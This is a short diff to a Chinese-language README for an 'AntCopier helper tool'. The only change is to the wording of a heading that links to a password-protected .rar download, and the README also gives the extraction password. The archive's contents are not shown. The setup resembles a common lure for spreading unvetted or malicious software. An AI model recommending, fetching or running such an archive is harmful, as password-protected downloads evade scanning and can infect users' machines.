@@ -1,7 +1,7 @@
 ![antcopier](https://github.com/tenderoffer/antcopier/assets/140397303/c25b4b4e-86be-45fd-a541-0e2855345282)   
 # **AntCopier辅助工具**
 
-## [点击下载最新版本](https://raw.githubusercontent.com/tenderoffer/AntCopier/main/AntCopier辅助工具.rar)    
+## [下载最新版本](https://raw.githubusercontent.com/tenderoffer/AntCopier/main/AntCopier辅助工具.rar)    
 解压缩密码：2023a    
 
 # **常见问题解答**       
